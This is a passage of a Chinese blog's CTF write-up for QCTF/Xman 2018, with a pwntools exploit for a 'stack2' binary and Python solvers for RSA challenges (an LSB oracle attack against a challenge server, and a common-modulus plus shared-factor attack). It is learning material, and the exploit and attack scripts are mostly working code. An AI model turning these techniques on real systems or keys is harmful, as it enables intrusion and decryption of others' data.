<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./stack2'</span>)</span><br><span class="line">payload = <span class="string">'1\n5\n3\n132\n80\n3\n133\n132\n3\n134\n4\n3\n135\n8\n3\n140\n135\n3\n141\n137\n3\n142\n4\n3\n143\n8\n5'</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">e = 0x10001</span><br><span class="line"></span><br><span class="line">n = 0x0b765daa79117afe1a77da7ff8122872bbcbddb322bb078fe0786dc40c9033fadd639adc48c3f2627fb7cb59bb0658707fe516967464439bdec2d6479fa3745f57c0a5ca255812f0884978b2a8aaeb750e0228cbe28a1e5a63bf0309b32a577eecea66f7610a9a4e720649129e9dc2115db9d4f34dc17f8b0806213c035e22f2c5054ae584b440def00afbccd458d020cae5fd1138be6507bc0b1a10da7e75def484c5fc1fcb13d11be691670cf38b487de9c4bde6c2c689be5adab08b486599b619a0790c0b2d70c9c461346966bcbae53c5007d0146fc520fa6e3106fbfc89905220778870a7119831c17f98628563ca020652d18d72203529a784ca73716db</span><br><span class="line"></span><br><span class="line">c = 0x4f377296a19b3a25078d614e1c92ff632d3e3ded772c4445b75e468a9405de05d15c77532964120ae11f8655b68a630607df0568a7439bc694486ae50b5c0c8507e5eecdea4654eeff3e75fb8396e505a36b0af40bd5011990663a7655b91c9e6ed2d770525e4698dec9455db17db38fa4b99b53438b9e09000187949327980ca903d0eef114afc42b771657ea5458a4cb399212e943d139b7ceb6d5721f546b75cd53d65e025f4df7eb8637152ecbb6725962c7f66b714556d754f41555c691a34a798515f1e2a69c129047cb29a9eef466c206a7f4dbc2cea1a46a39ad3349a7db56c1c997dc181b1afcb76fa1bbbf118a4ab5c515e274ab2250dba1872be0</span><br></pre></td></tr></table></figure>
<p>这题需要了解一下<a href="https://introspelliam.github.io/2018/03/27/crypto/RSA-Least-Significant-Bit-Oracle-Attack/" target="_blank" rel="noopener">最低有效位（LSB）oracle攻击</a>。</p>
<p>对RSA不是特别熟悉。暂时先贴上<a href="http://www.cnblogs.com/semishigure/p/9318258.html" target="_blank" rel="noopener">大佬博客</a>中的脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment"># author:401219180</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getevenOrodd</span><span class="params">(c)</span>:</span></span><br><span class="line">    <span class="string">"""nc连接获取even or odd"""</span></span><br><span class="line">    adress = <span class="string">"47.96.239.28"</span></span><br><span class="line">    port = <span class="number">23333</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((adress, int(port)))</span><br><span class="line">    s.recv(<span class="number">1024</span>)</span><br><span class="line">    data = hex(c)[:<span class="number">-1</span>] + <span class="string">"\n"</span></span><br><span class="line">    s.send(data)</span><br><span class="line">    codeindex = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.shutdown(<span class="number">1</span>)</span><br><span class="line">    s.close()</span><br><span class="line">    <span class="keyword">print</span> codeindex</span><br><span class="line">    <span class="keyword">return</span> codeindex</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(n)</span>:</span></span><br><span class="line">    LB = <span class="number">0</span></span><br><span class="line">    UB = n</span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    c = int(<span class="string">"0x4f377296a19b3a25078d614e1c92ff632d3e3ded772c4445b75e468a9405de05d15c77532964120ae11f8655b68a630607df0568a7439bc694486ae50b5c0c8507e5eecdea4654eeff3e75fb8396e505a36b0af40bd5011990663a7655b91c9e6ed2d770525e4698dec9455db17db38fa4b99b53438b9e09000187949327980ca903d0eef114afc42b771657ea5458a4cb399212e943d139b7ceb6d5721f546b75cd53d65e025f4df7eb8637152ecbb6725962c7f66b714556d754f41555c691a34a798515f1e2a69c129047cb29a9eef466c206a7f4dbc2cea1a46a39ad3349a7db56c1c997dc181b1afcb76fa1bbbf118a4ab5c515e274ab2250dba1872be0"</span>,<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">while</span> LB != UB:</span><br><span class="line">        c1 = (pow(<span class="number">2</span>, e, n) * c) % n</span><br><span class="line">        <span class="keyword">if</span> getevenOrodd(c1)[:<span class="number">-1</span>] == <span class="string">"even"</span>:</span><br><span class="line">            UB = (UB + LB) / <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            LB = (UB + LB) / <span class="number">2</span></span><br><span class="line">        c = c1</span><br><span class="line">    <span class="keyword">print</span> LB</span><br><span class="line"></span><br><span class="line">n=int(<span class="string">"0x0b765daa79117afe1a77da7ff8122872bbcbddb322bb078fe0786dc40c9033fadd639adc48c3f2627fb7cb59bb0658707fe516967464439bdec2d6479fa3745f57c0a5ca255812f0884978b2a8aaeb750e0228cbe28a1e5a63bf0309b32a577eecea66f7610a9a4e720649129e9dc2115db9d4f34dc17f8b0806213c035e22f2c5054ae584b440def00afbccd458d020cae5fd1138be6507bc0b1a10da7e75def484c5fc1fcb13d11be691670cf38b487de9c4bde6c2c689be5adab08b486599b619a0790c0b2d70c9c461346966bcbae53c5007d0146fc520fa6e3106fbfc89905220778870a7119831c17f98628563ca020652d18d72203529a784ca73716db"</span>,<span class="number">16</span>)</span><br><span class="line">decrypt(n)</span><br><span class="line"></span><br><span class="line">LB = <span class="number">560856645743734814774953158390773525781916094468093308691660509501812320</span></span><br><span class="line">plaintext = binascii.unhexlify(hex(LB)[<span class="number">2</span>:<span class="number">-1</span>])</span><br><span class="line">print(plaintext)</span><br></pre></td></tr></table></figure>
<h2 id="Xman-RSA"><a href="#Xman-RSA" class="headerlink" title="Xman-RSA"></a>Xman-RSA</h2><p>拿到四个文件后，其中有一个很像python的脚本，通过对关键字等的判断，自己写脚本还原：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">l1 = &#123;</span><br><span class="line">    <span class="string">'a'</span>: <span class="string">'d'</span>,</span><br><span class="line">    <span class="string">'b'</span>: <span class="string">'m'</span>,</span><br><span class="line">    <span class="string">'d'</span>: <span class="string">'e'</span>,</span><br><span class="line">    <span class="string">'e'</span>: <span class="string">'n'</span>,</span><br><span class="line">    <span class="string">'f'</span>: <span class="string">'w'</span>,</span><br><span class="line">    <span class="string">'g'</span>: <span class="string">'f'</span>,</span><br><span class="line">    <span class="string">'h'</span>: <span class="string">'o'</span>,</span><br><span class="line">    <span class="string">'i'</span>: <span class="string">'x'</span>,</span><br><span class="line">    <span class="string">'j'</span>: <span class="string">'g'</span>,</span><br><span class="line">    <span class="string">'k'</span>: <span class="string">'p'</span>,</span><br><span class="line">    <span class="string">'l'</span>: <span class="string">'y'</span>,</span><br><span class="line">    <span class="string">'m'</span>: <span class="string">'h'</span>,</span><br><span class="line">    <span class="string">'p'</span>: <span class="string">'i'</span>,</span><br><span class="line">    <span class="string">'q'</span>: <span class="string">'r'</span>,</span><br><span class="line">    <span class="string">'r'</span>: <span class="string">'a'</span>,</span><br><span class="line">    <span class="string">'t'</span>: <span class="string">'s'</span>,</span><br><span class="line">    <span class="string">'u'</span>: <span class="string">'b'</span>,</span><br><span class="line">    <span class="string">'v'</span>: <span class="string">'k'</span>,</span><br><span class="line">    <span class="string">'w'</span>: <span class="string">'t'</span>,</span><br><span class="line">    <span class="string">'x'</span>: <span class="string">'c'</span>,</span><br><span class="line">    <span class="string">'y'</span>: <span class="string">'l'</span>,</span><br><span class="line">    <span class="string">'z'</span>: <span class="string">'u'</span></span><br><span class="line">&#125;</span><br><span class="line">f = open(<span class="string">'1.py'</span>, <span class="string">'r'</span>)</span><br><span class="line">ans = f.read()</span><br><span class="line"><span class="comment"># print(ans)</span></span><br><span class="line">res = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> ans:</span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> key, value <span class="keyword">in</span> l1.items():</span><br><span class="line">        <span class="keyword">if</span> ch == key:</span><br><span class="line">            res += value</span><br><span class="line">            <span class="comment"># print(value, end='')</span></span><br><span class="line">            flag = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res += ch</span><br><span class="line">        <span class="comment"># print(ch, end='')</span></span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>
<p>还原出原来的脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> is_prime</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bytes_to_num</span><span class="params">(b)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> int(b.encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">num_to_bytes</span><span class="params">(n)</span>:</span></span><br><span class="line">	b = hex(n)[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line">	b = <span class="string">'0'</span> + b <span class="keyword">if</span> len(b)%<span class="number">2</span> == <span class="number">1</span> <span class="keyword">else</span> b</span><br><span class="line">	<span class="keyword">return</span> b.decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_a_prime</span><span class="params">(l)</span>:</span></span><br><span class="line">	random_seed = urandom(l)</span><br><span class="line"></span><br><span class="line">	num = bytes_to_num(random_seed)</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">		<span class="keyword">if</span> is_prime(num):</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		num+=<span class="number">1</span></span><br><span class="line">	<span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(s, e, n)</span>:</span></span><br><span class="line">	p = bytes_to_num(s)</span><br><span class="line">	p = pow(p, e, n)</span><br><span class="line">	<span class="keyword">return</span> num_to_bytes(p).encode(<span class="string">'hex'</span>)	</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">separate</span><span class="params">(n)</span>:</span></span><br><span class="line">	p = n % <span class="number">4</span></span><br><span class="line">	t = (p*p) % <span class="number">4</span></span><br><span class="line">	<span class="keyword">return</span> t == <span class="number">1</span></span><br><span class="line">	</span><br><span class="line">f = open(<span class="string">'flag.txt'</span>, <span class="string">'r'</span>)</span><br><span class="line">flag = f.read()</span><br><span class="line">		</span><br><span class="line">msg1 = <span class="string">""</span></span><br><span class="line">msg2 = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag)):</span><br><span class="line">	<span class="keyword">if</span> separate(i):</span><br><span class="line">		msg2 += flag[i]</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		msg1 += flag[i]</span><br><span class="line"></span><br><span class="line">p1 = get_a_prime(<span class="number">128</span>)</span><br><span class="line">p2 = get_a_prime(<span class="number">128</span>)</span><br><span class="line">p3 = get_a_prime(<span class="number">128</span>)</span><br><span class="line">n1 = p1*p2</span><br><span class="line">n2 = p1*p3</span><br><span class="line">e = <span class="number">0x1001</span></span><br><span class="line">c1 = encrypt(msg1, e, n1)</span><br><span class="line">c2 = encrypt(msg2, e, n2)</span><br><span class="line">print(c1)</span><br><span class="line">print(c2)</span><br><span class="line"></span><br><span class="line">e1 = <span class="number">0x1001</span></span><br><span class="line">e2 = <span class="number">0x101</span></span><br><span class="line">p4 = get_a_prime(<span class="number">128</span>)</span><br><span class="line">p5 = get_a_prime(<span class="number">128</span>)</span><br><span class="line">n3 = p4*p5</span><br><span class="line">c1 = num_to_bytes(pow(n1, e1, n3)).encode(<span class="string">'hex'</span>)</span><br><span class="line">c2 = num_to_bytes(pow(n1, e2, n3)).encode(<span class="string">'hex'</span>)</span><br><span class="line">print(c1)</span><br><span class="line">print(c2)</span><br><span class="line"></span><br><span class="line">print(base64.b64encode(num_to_bytes(n2)))</span><br><span class="line">print(base64.b64encode(num_to_bytes(n3)))</span><br></pre></td></tr></table></figure>
<p>代码看完后，思路是先用共模攻击解出<code>n1</code>，之后利用公约数得到<code>p1</code>、<code>p2</code>、<code>p3</code>，再求出<code>d1</code>、<code>d2</code>，最后解出<code>msg1</code>、<code>msg2</code>。</p>
<p>贴上<a href="http://www.cnblogs.com/semishigure/p/9318258.html" target="_blank" rel="noopener">大佬博客</a>中的脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment"># author:401219180</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x1001</span></span><br><span class="line">e1 = <span class="number">0x1001</span></span><br><span class="line">e2 = <span class="number">0x101</span></span><br><span class="line"></span><br><span class="line">n2cipertext = <span class="string">"PVNHb2BfGAnmxLrbKhgsYXRwWIL9eOj6K0s3I0slKHCTXTAUtZh3T0r+RoSlhpO3+77AY8P7WETYz2Jzuv5FV/mMODoFrM5fMyQsNt90VynR6J3Jv+fnPJPsm2hJ1Fqt7EKaVRwCbt6a4BdcRoHJsYN/+eh7k/X+FL5XM7viyvQxyFawQrhSV79FIoX6xfjtGW+uAeVF7DScRcl49dlwODhFD7SeLqzoYDJPIQS+VSb3YtvrDgdV+EhuS1bfWvkkXRijlJEpLrgWYmMdfsYX8u/+Ylf5xcBGn3hv1YhQrBCg77AHuUF2w/gJ/ADHFiMcH3ux3nqOsuwnbGSr7jA6Cw=="</span></span><br><span class="line">n3cipertext = <span class="string">"TmNVbWUhCXR1od3gBpM+HGMKK/4ErfIKITxomQ/QmNCZlzmmsNyPXQBiMEeUB8udO7lWjQTYGjD6k21xjThHTNDG4z6C2cNNPz73VIaNTGz0hrh6CmqDowFbyrk+rv53QSkVKPa8EZnFKwGz9B3zXimm1D+01cov7V/ZDfrHrEjsDkgK4ZlrQxPpZAPl+yqGlRK8soBKhY/PF3/GjbquRYeYKbagpUmWOhLnF4/+DP33ve/EpaSAPirZXzf8hyatL4/5tAZ0uNq9W6T4GoMG+N7aS2GeyUA2sLJMHymW4cFK5l5kUvjslRdXOHTmz5eHxqIV6TmSBQRgovUijlNamQ=="</span></span><br><span class="line"></span><br><span class="line">n2hex = base64.b64decode(n2cipertext).encode(<span class="string">"hex"</span>)</span><br><span class="line">n3hex = base64.b64decode(n3cipertext).encode(<span class="string">"hex"</span>)</span><br><span class="line"></span><br><span class="line">n3 = int(n3hex, <span class="number">16</span>)</span><br><span class="line">n2 = int(n2hex, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">n1ciper1hex = <span class="string">"2639c28e3609a4a8c953cca9c326e8e062756305ae8aee6efcd346458aade3ee8c2106ab9dfe5f470804f366af738aa493fd2dc26cb249a922e121287f3eddec0ed8dea89747dc57aed7cd2089d75c23a69bf601f490a64f73f6a583081ae3a7ed52238c13a95d3322065adba9053ee5b12f1de1873dbad9fbf4a50a2f58088df0fddfe2ed8ca1118c81268c8c0fd5572494276f4e48b5eb424f116e6f5e9d66da1b6b3a8f102539b690c1636e82906a46f3c5434d5b04ed7938861f8d453908970eccef07bf13f723d6fdd26a61be8b9462d0ddfbedc91886df194ea022e56c1780aa6c76b9f1c7d5ea743dc75cec3c805324e90ea577fa396a1effdafa3090"</span></span><br><span class="line">n1ciper2hex = <span class="string">"42ff1157363d9cd10da64eb4382b6457ebb740dbef40ade9b24a174d0145adaa0115d86aa2fc2a41257f2b62486eaebb655925dac78dd8d13ab405aef5b8b8f9830094c712193500db49fb801e1368c73f88f6d8533c99c8e7259f8b9d1c926c47215ed327114f235ba8c873af7a0052aa2d32c52880db55c5615e5a1793b690c37efdd5e503f717bb8de716303e4d6c4116f62d81be852c5d36ef282a958d8c82cf3b458dcc8191dcc7b490f227d1562b1d57fbcf7bf4b78a5d90cd385fd79c8ca4688e7d62b3204aeaf9692ba4d4e44875eaa63642775846434f9ce51d138ca702d907849823b1e86896e4ea6223f93fae68b026cfe5fa5a665569a9e3948a"</span></span><br><span class="line"></span><br><span class="line">n1ciper1 = int(n1ciper1hex, <span class="number">16</span>)</span><br><span class="line">n1ciper2 = int(n1ciper2hex, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 共模攻击</span></span><br><span class="line">gcd, s, t = gmpy2.gcdext(e1, e2)</span><br><span class="line"><span class="keyword">if</span> s &lt; <span class="number">0</span>:</span><br><span class="line">    s = -s</span><br><span class="line">    n1ciper1 = gmpy2.invert(n1ciper1, n3)</span><br><span class="line"><span class="keyword">if</span> t &lt; <span class="number">0</span>:</span><br><span class="line">    t = -t</span><br><span class="line">    n1ciper2 = gmpy2.invert(n1ciper2, n3)</span><br><span class="line">n1 = gmpy2.powmod(n1ciper1, s, n3) * gmpy2.powmod(n1ciper2, t, n3) % n3</span><br><span class="line"><span class="keyword">print</span> n1</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">因为</span></span><br><span class="line"><span class="string">n1 = p1 * p2</span></span><br><span class="line"><span class="string">n2 = p1 * p3</span></span><br><span class="line"><span class="string">可求得公约数p1，然后依次解出p2,p3</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">p1 = gmpy2.gcd(n1, n2)</span><br><span class="line">p2 = n1 / p1</span><br><span class="line">p3 = n2 / p1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解出d1,d2</span></span><br><span class="line">d1 = gmpy2.invert(e, (p1 - <span class="number">1</span>) * (p2 - <span class="number">1</span>))</span><br><span class="line">d2 = gmpy2.invert(e, (p1 - <span class="number">1</span>) * (p3 - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">c1hex = <span class="string">"1240198b148089290e375b999569f0d53c32d356b2e95f5acee070f016b3bef243d0b5e46d9ad7aa7dfe2f21bda920d0ac7ce7b1e48f22b2de410c6f391ce7c4347c65ffc9704ecb3068005e9f35cbbb7b27e0f7a18f4f42ae572d77aaa3ee189418d6a07bab7d93beaa365c98349d8599eb68d21313795f380f05f5b3dfdc6272635ede1f83d308c0fdb2baf444b9ee138132d0d532c3c7e60efb25b9bf9cb62dba9833aa3706344229bd6045f0877661a073b6deef2763452d0ad7ab3404ba494b93fd6dfdf4c28e4fe83a72884a99ddf15ca030ace978f2da87b79b4f504f1d15b5b96c654f6cd5179b72ed5f84d3a16a8f0d5bf6774e7fd98d27bf3c9839"</span></span><br><span class="line">c2hex = <span class="string">"129d5d4ab3f9e8017d4e6761702467bbeb1b884b6c4f8ff397d078a8c41186a3d52977fa2307d5b6a0ad01fedfc3ba7b70f776ba3790a43444fb954e5afd64b1a3abeb6507cf70a5eb44678a886adf81cb4848a35afb4db7cd7818f566c7e6e2911f5ababdbdd2d4ff9825827e58d48d5466e021a64599b3e867840c07e29582961f81643df07f678a61a9f9027ebd34094e272dfbdc4619fa0ac60f0189af785df77e7ec784e086cf692a7bf7113a7fb8446a65efa8b431c6f72c14bcfa49c9b491fb1d87f2570059e0f13166a85bb555b40549f45f04bc5dbd09d8b858a5382be6497d88197ffb86381085756365bd757ec3cdfa8a77ba1728ec2de596c5ab"</span></span><br><span class="line"></span><br><span class="line">c1 = int(c1hex, <span class="number">16</span>)</span><br><span class="line">c2 = int(c2hex, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">msg1 = pow(c1, d1, n1)</span><br><span class="line">msg2 = pow(c2, d2, n2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> msg1</span><br><span class="line"><span class="keyword">print</span> msg2</span><br><span class="line"></span><br><span class="line">plantext1 = binascii.unhexlify(hex(msg1)[<span class="number">2</span>:])</span><br><span class="line">plantext2 = binascii.unhexlify(hex(msg2)[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span><span class="keyword">for</span> i <span class="keyword">in</span> range(len(plantext1) - <span class="number">1</span>):</span><br><span class="line">    flag += (plantext1[i] + plantext2[i])</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
<h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><p><a href="https://ihomura.cn/2018/07/15/WriteUp-QCTF-Xman-babymips/" target="_blank" rel="noopener">https://ihomura.cn/2018/07/15/WriteUp-QCTF-Xman-babymips/</a><br><a href="https://www.xctf.org.cn/library/details/8723e039db0164e2f7345a12d2edd2a5e800adf7/" target="_blank" rel="noopener">https://www.xctf.org.cn/library/details/8723e039db0164e2f7345a12d2edd2a5e800adf7/</a><br><a href="https://ihomura.cn/2018/07/15/WriteUp-QCTF-Xman-stack2/" target="_blank" rel="noopener">https://ihomura.cn/2018/07/15/WriteUp-QCTF-Xman-stack2/</a><br><a href="https://www.xmsec.cc/stackoverflow-ropbasic/" target="_blank" rel="noopener">https://www.xmsec.cc/stackoverflow-ropbasic/</a><br><a href="https://blog.csdn.net/xuchen16/article/details/81080580" target="_blank" rel="noopener">https://blog.csdn.net/xuchen16/article/details/81080580</a><br><a href="https://blog.csdn.net/xuchen16/article/details/81064079" target="_blank" rel="noopener">https://blog.csdn.net/xuchen16/article/details/81064079</a><br><a href="http://www.freebuf.com/column/177864.html" target="_blank" rel="noopener">http://www.freebuf.com/column/177864.html</a><br><a href="https://introspelliam.github.io/2018/03/27/crypto/RSA-Least-Significant-Bit-Oracle-Attack/" target="_blank" rel="noopener">https://introspelliam.github.io/2018/03/27/crypto/RSA-Least-Significant-Bit-Oracle-Attack/</a><br><a href="http://www.cnblogs.com/semishigure/p/9318258.html" target="_blank" rel="noopener">http://www.cnblogs.com/semishigure/p/9318258.html</a></p>

      
    </div>
    <footer class="article-footer">
      
        <div id="donation_div"></div>

<script src="/js/vdonate.js"></script>
<script>
var a = new Donate({
  title: '我 可爱 打钱', // 可选参数，打赏标题
  btnText: 'Donate', // 可选参数，打赏按钮文字
  el: document.getElementById('donation_div'),
  wechatImage: 'http://t1.aixinxi.net/o_1c7bjknhco0c17af10n6ml016l5a.jpg-j.jpg',
  alipayImage: 'http://t1.aixinxi.net/o_1c7bjgpua1knr1ncl18f9g18c5ba.jpg-j.jpg'
});
</script>
      
      
        
	<div id="comment">
		<!-- 来必力City版安装代码 -->
		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTQ4MS82MDQ5">
		<script type="text/javascript">
		   (function(d, s) {
		       var j, e = d.getElementsByTagName(s)[0];

		       if (typeof LivereTower === 'function') { return; }

		       j = d.createElement(s);
		       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
		       j.async = true;

		       e.parentNode.insertBefore(j, e);
		   })(document, 'script');
		</script>
		<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
		</div>
		<!-- City版安装代码已完成 -->
	</div>



      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/">wp</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2018/07/23/MIPS汇编指令/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          MIPS汇编指令
        
      </div>
    </a>
  
  
    <a href="/2018/07/13/BIN集训（七）/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">BIN集训（七）</div>
    </a>
  
